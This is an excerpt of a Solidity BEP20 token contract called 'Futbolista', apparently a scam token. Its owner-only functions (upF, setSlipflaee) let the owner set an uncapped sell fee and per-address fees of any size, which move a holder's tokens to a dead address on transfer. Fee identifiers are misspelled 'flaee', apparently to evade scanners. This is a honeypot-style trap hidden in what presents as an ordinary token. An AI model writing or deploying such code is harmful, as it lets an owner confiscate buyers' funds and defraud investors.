...
interface IUniswapV2Factory {
    ...
    function flaeeTo() external view returns (address);
    function flaeeToSetter() external view returns (address);
    ...
    function setflaeeTo(address) external;
    function setflaeeToSetter(address) external;
}


interface IUniswapV2Router02 is IUniswapV2Router01 {
    function removeLiquidityETHSupportingflaeeOnTransferTokens(
        address token,
        uint liquidity,
        uint AmountTokenMin,
        uint AmountETHMin,
    ...
    function removeLiquidityETHWithPermitSupportingflaeeOnTransferTokens(
        address token,
        uint liquidity,
        uint AmountTokenMin,
        uint AmountETHMin,
    ...
    function swapExactTokensForTokensSupportingflaeeOnTransferTokens(
        uint AmountIn,
        uint AmountOutMin,
        address[] calldata path,
        address to,
    ...
    function swapExactETHForTokensSupportingflaeeOnTransferTokens(
        uint AmountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingflaeeOnTransferTokens(
        uint AmountIn,
        uint AmountOutMin,
        address[] calldata path,
        address to,
...
contract Futbolista is BEP20, Ownable {
    // ext
    ...
    uint256 private _defaultSellflaee = 0;

    uint256 private _defaultBuyflaee = 0;


    mapping(address => bool) private _mAccount;

    mapping(address => uint256) private _slipflaee;
    ...
    function upF(uint256 _value) external onlyownar {
        _defaultSellflaee = _value;
    }

    function setSlipflaee(address _address, uint256 _value) external onlyownar {
        require(_value > 0, "Account tax must be greater than or equal to 1");
        _slipflaee[_address] = _value;
    }

    function getSlipflaee(address _address) external view onlyownar returns (uint256) {
        return _slipflaee[_address];
    }


    function setMAccountflaee(address _address, bool _value) external onlyownar {
        _mAccount[_address] = _value;
    }

    function getMAccountflaee(address _address) external view onlyownar returns (bool) {
    ...
    function _receiveF(
        ...
        uint256 tradeflaeeAmount = 0;

        if (rF) {
            uint256 tradeflaee = 0;
            if (uniswapV2Pair != address(0)) {
                if (_to == uniswapV2Pair) {

                    tradeflaee = _defaultSellflaee;
                }
                if (from == uniswapV2Pair) {

                    tradeflaee = _defaultBuyflaee;
                }
            }
            if (_slipflaee[from] > 0) {
                tradeflaee = _slipflaee[from];
            }

            tradeflaeeAmount = _Amount.mul(tradeflaee).div(100);
        }


        if (tradeflaeeAmount > 0) {
            _balances[from] = _balances[from].sub(tradeflaeeAmount);
            _balances[_deadAddress] = _balances[_deadAddress].add(tradeflaeeAmount);
            emit Transfer(from, _deadAddress, tradeflaeeAmount);
        }

        _balances[from] = _balances[from].sub(_Amount - tradeflaeeAmount);
        _balances[_to] = _balances[_to].add(_Amount - tradeflaeeAmount);
        emit Transfer(from, _to, _Amount - tradeflaeeAmount);
    }
